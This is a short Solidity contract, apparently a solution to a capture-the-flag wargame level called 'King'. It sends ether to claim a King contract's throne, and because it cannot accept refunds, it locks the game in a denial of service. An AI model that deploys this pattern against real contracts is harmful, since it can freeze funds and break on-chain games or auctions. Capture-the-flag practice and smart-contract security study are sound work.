// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface King {

}

contract KingAttack {

    King kingContract;

    constructor(address _king) payable {
        kingContract = King(_king);
    }

  function attack() external payable {
    (bool sent, bytes memory data) = address(kingContract).call{value: msg.value}("");
    require(sent, "Failed to send ether");
    data; // use variable to silence warning
  }
}
